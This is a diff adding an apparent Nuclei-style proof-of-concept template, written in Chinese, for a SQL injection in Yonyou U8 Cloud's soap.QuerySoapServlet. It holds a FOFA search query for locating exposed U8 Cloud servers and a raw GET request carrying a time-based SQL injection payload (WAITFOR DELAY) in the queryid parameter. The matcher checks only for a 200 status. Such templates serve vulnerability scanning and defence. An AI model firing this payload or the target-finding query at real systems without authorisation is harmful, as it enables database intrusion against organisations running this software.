@@ -1,0 +1,19 @@
+id: poc-zgxnt5a5elg4t4qi
+info:
+  name: 用友u8 cloud soap.QuerySoapServlet 存在SQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zgxnt5a5elg4t4qi'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: zgxnt5a5elg4t4qi
+    fofa: title=="U8C" || body="开启U8 cloud云端之旅" || (body="UFIDA" && body="logo/images/") || body="logo/images/ufida_nc.png" || body="uclient.yonyou.com" || body="nccloud"|| banner="U8C" || body="/u8sl/Login.asp
+http:
+- raw:
+  - GET /service/~uapqe/nc.bs.pub.querymodel.soap.QuerySoapServlet?queryid=1%27%3BWAITFOR+DELAY+%270%3A0%3A3%27-- HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
